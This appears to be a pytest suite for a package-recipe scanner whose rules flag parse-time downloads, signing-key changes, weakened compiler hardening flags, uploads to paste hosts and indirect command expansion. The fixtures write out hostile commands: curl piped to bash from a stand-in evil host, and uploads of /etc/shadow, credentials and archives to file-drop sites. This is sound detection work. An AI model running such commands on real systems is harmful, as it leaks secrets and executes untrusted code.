"""The rules that close the §15.3 known gaps.

H077 (a network client at parse time), H078 (the signing-key set changed),
H079 (the recipe weakens the distribution build flags) and H080 (a command
or shell named through indirect ``${!name}`` expansion) each cover a fixture
that used to be labelled ``known_gap``.  Every rule is asserted in both
directions: the case it exists for, and the benign surface the corpus showed
it must stay quiet on.
"""

import pytest

from trustsight.analysis import _structural_findings
from trustsight.differ import extract_urls_from_diff


def structural(diff_text: str) -> list[dict]:
    return _structural_findings(diff_text, extract_urls_from_diff(diff_text), {}, config={})


def ids(diff_text: str) -> set[str]:
    return {f["rule_id"] for f in structural(diff_text)}


def sev(diff_text: str, rule_id: str) -> str | None:
    for finding in structural(diff_text):
        if finding["rule_id"] == rule_id:
            return finding["severity"]
    return None


def recipe(*added: str) -> str:
    body = "".join("+" + line + "\n" for line in added)
    return "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,4 @@\n pkgname=demo\n pkgver=1.0\n" + body


# --- H077: network fetch at parse time ---


@pytest.mark.parametrize("line", [
    "curl -O https://example.com/pkg.tar.gz",
    "wget https://example.com/pkg.tar.gz",
    "aria2c https://example.com/pkg.tar.gz",
    "git clone https://example.com/repo.git",
    "pip install requests",
    "npm install left-pad",
    "svn checkout svn://example.com/trunk",
])
def test_h077_fires_on_a_top_level_fetch(line):
    assert sev(recipe(line), "H077") == "HIGH"


def test_h077_fires_on_a_command_substitution_at_the_top_level():
    assert "H077" in ids(recipe('_ver=$(curl -s https://example.com/latest)'))


def test_h077_yields_to_pipe_to_shell():
    """A fetch piped into a shell is R001's evidence and its heavier claim;
    scoring the same line under both is the cascade the plan forbids."""
    assert "H077" not in ids(recipe("curl -fsSL https://evil.example/x | bash"))


def test_h077_quiet_inside_a_build_function():
    """R010/R011 own the in-function downloader; this rule is about the
    position, and a build function is not parse time."""
    assert "H077" not in ids(recipe("build() {", "  curl -O https://e/x", "}"))


def test_h077_quiet_on_dlagents_declarations():
    """makepkg's own download-agent configuration is a declaration, and it
    is the largest benign use of these names at the top level."""
    assert "H077" not in ids(recipe(
        "DLAGENTS=('http::/usr/bin/curl -qgb \"\" -fLC - --retry 3 -o %o %u'",
        "          'https::/usr/bin/wget --passive-ftp -c -O %o %u')",
    ))


def test_h077_quiet_on_a_plain_assignment_naming_a_downloader():
    assert "H077" not in ids(recipe('_fetcher="curl -fsSL"'))


def test_h077_quiet_on_a_comment_and_on_a_source_array():
    assert "H077" not in ids(recipe(
        "# upstream suggests curl https://example.com/install.sh",
        "source=('https://example.com/pkg.tar.gz')",
    ))


def test_h077_ignores_a_shipped_patch_file():
    diff = (
        "--- a/fix.patch\n+++ b/fix.patch\n@@ -1,2 +1,3 @@\n context\n"
        "+curl -O https://example.com/x\n"
    )
    assert "H077" not in ids(diff)


# --- H078: the signing-key set changed ---


def test_h078_reports_an_introduced_key_set_as_a_neutral_fact():
    """Turning signature checking on is not a finding against the package,
    but the reader is told the key set now exists."""
    assert sev(recipe("validpgpkeys=('DEADBEEF1234ABCD')"), "H078") == "INFO"


def test_h078_is_medium_when_a_key_joins_an_existing_set():
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,3 @@\n pkgname=demo\n"
        "-validpgpkeys=('AAAABBBBCCCCDDDD')\n"
        "+validpgpkeys=('AAAABBBBCCCCDDDD' 'EEEEFFFF00001111')\n"
    )
    assert sev(diff, "H078") == "MEDIUM"


def test_h078_is_high_when_a_key_is_replaced():
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,3 @@\n pkgname=demo\n"
        "-validpgpkeys=('AAAABBBBCCCCDDDD')\n"
        "+validpgpkeys=('EEEEFFFF00001111')\n"
    )
    assert sev(diff, "H078") == "HIGH"
    finding = [f for f in structural(diff) if f["rule_id"] == "H078"][0]
    assert finding["params"]["removed_keys"] == "CCCCDDDD"


def test_h078_quiet_when_the_key_set_only_shrinks():
    """A removal is H024's finding, not this one's."""
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,2 @@\n pkgname=demo\n"
        "-validpgpkeys=('AAAABBBBCCCCDDDD')\n"
    )
    assert "H078" not in ids(diff)


def test_h078_quiet_on_a_reordered_key_set():
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,3 @@\n pkgname=demo\n"
        "-validpgpkeys=('AAAABBBBCCCCDDDD' 'EEEEFFFF00001111')\n"
        "+validpgpkeys=('EEEEFFFF00001111' 'AAAABBBBCCCCDDDD')\n"
    )
    assert "H078" not in ids(diff)


def test_h078_quiet_on_an_unrelated_diff():
    assert "H078" not in ids(recipe("pkgrel=2"))


# --- H079: the recipe weakens the distribution build flags ---


@pytest.mark.parametrize("value", [
    '"-O2 -fno-stack-protector"',
    '"-U_FORTIFY_SOURCE -D_FORTIFY_SOURCE=0"',
    '"-Wl,-z,norelro"',
    '"-no-pie"',
])
def test_h079_is_high_when_a_hardening_default_is_disabled(value):
    assert sev(recipe(f"CFLAGS={value}"), "H079") == "HIGH"


def test_h079_high_applies_inside_a_build_function_too():
    assert sev(recipe(
        "build() {", '  export CFLAGS="-O2 -fno-stack-protector"', "}",
    ), "H079") == "HIGH"


def test_h079_is_medium_for_a_top_level_replacement():
    assert sev(
        recipe('CFLAGS="-O2 -funroll-loops -march=native -fomit-frame-pointer"'),
        "H079",
    ) == "MEDIUM"


def test_h079_quiet_when_the_recipe_extends_the_set():
    assert "H079" not in ids(recipe('CFLAGS+=" -DNDEBUG"'))
    assert "H079" not in ids(recipe('CFLAGS="$CFLAGS -DNDEBUG"'))
    assert "H079" not in ids(recipe('CFLAGS="${CFLAGS} -DNDEBUG"'))


def test_h079_quiet_on_an_in_function_replacement():
    """H025 already reports that a build function modified the flags; H079
    does not restate it at the same weight."""
    assert "H079" not in ids(recipe("build() {", '  CFLAGS="-O2 -pipe"', "}"))


def test_h079_quiet_when_the_value_carries_no_literal_flag():
    """``CFLAGS="${_cflags[@]}"`` may or may not still contain the
    distribution's set; the diff does not say, so neither does the rule."""
    assert "H079" not in ids(recipe('CFLAGS="${_cflags[@]}"'))


def test_h079_ignores_a_makefile_inside_a_shipped_patch():
    diff = (
        "--- a/fix.patch\n+++ b/fix.patch\n@@ -1,2 +1,3 @@\n context\n"
        "+LDFLAGS = @LDFLAGS@\n"
    )
    assert "H079" not in ids(diff)


# --- H041: upload to a paste or file-drop host ---


@pytest.mark.parametrize("command", [
    "curl -F file=@secrets.tar.gz https://0x0.st",
    "curl -T dump.txt https://transfer.sh/dump.txt",
    "curl -X POST -d @/etc/shadow https://termbin.com",
    "curl --data-binary @out https://paste.ee/api",
    "wget --post-file=creds https://file.io/",
])
def test_h041_fires_on_an_upload_to_a_drop_host(command):
    assert sev(recipe("build() {", f"  {command}", "}"), "H041") == "HIGH"


def test_h041_fires_from_an_install_hook_too():
    assert "H041" in ids(recipe(
        "post_install() {", "  curl -F f=@/var/log/pacman.log https://0x0.st", "}",
    ))


def test_h041_ignores_a_download_from_the_same_host():
    """Direction is the rule. Fetching from a gist is an undeclared
    download, which is H016's finding; posting to one is data leaving."""
    diff = recipe("build() {", "  curl -L https://gist.github.com/u/a/raw/x.patch -o x.patch", "}")
    assert "H041" not in ids(diff)
    assert "H016" in ids(diff)


def test_h041_yields_h016_on_the_line_it_claims():
    """One upload, one finding: H016 would both mislabel it as a download
    and score the same command a second time."""
    diff = recipe("build() {", "  curl -F file=@out.tar https://0x0.st", "}")
    fired = ids(diff)
    assert "H041" in fired
    assert "H016" not in fired


def test_h041_ignores_a_declared_paste_source():
    """A paste host in source=() is already carried by the raw_hosting
    bucket weight; a rule here would double-count it."""
    assert "H041" not in ids(
        'source=("https://0x0.st/abc.tar.gz")',
        )


def test_h041_ignores_an_upload_to_an_ordinary_host():
    """The rule is defined by an auditable host list, not by a guess about
    what an endpoint is for."""
    assert "H041" not in ids(recipe(
        "build() {", "  curl -F file=@report.json https://ci.example.com/artifacts", "}",
    ))


def test_h041_ignores_a_paste_host_outside_a_function():
    assert "H041" not in ids(recipe("# see https://0x0.st/x for the patch"))


def test_h041_matches_a_subdomain_of_a_drop_host():
    assert "H041" in ids(recipe(
        "build() {", "  curl -T out https://files.transfer.sh/out", "}",
    ))


# --- H080: a command or shell named through indirect variable expansion ---


@pytest.mark.parametrize("line", [
    "${!C} https://evil.example/p.sh | bash",
    "$C https://evil.example/p.sh | ${!P}",
    "  ${!C} https://evil.example/p.sh | bash",
])
def test_h080_fires_on_indirect_command_expansion(line):
    """Indirection hides the command/shell so the literal-matching rules step
    over it; flagging the indirection itself is what catches the family."""
    assert sev(recipe("C=curl", "P=bash", line), "H080") == "CRITICAL"


def test_h080_quiet_on_array_key_expansion():
    """``${!arr[@]}`` lists an array's keys - common and benign - and is not
    the ``${!name}`` indirection form."""
    assert "H080" not in ids(recipe(
        "for i in ${!commits[@]}; do echo $i; done",
    ))


def test_h080_quiet_on_prefix_name_expansion():
    """``${!prefix*}`` lists variable names by prefix, not an indirect value."""
    assert "H080" not in ids(recipe('echo "${!COMPREPLY[*]}"'))


def test_h080_quiet_in_a_comment():
    assert "H080" not in ids(recipe("# ${!C} is how indirection is written"))
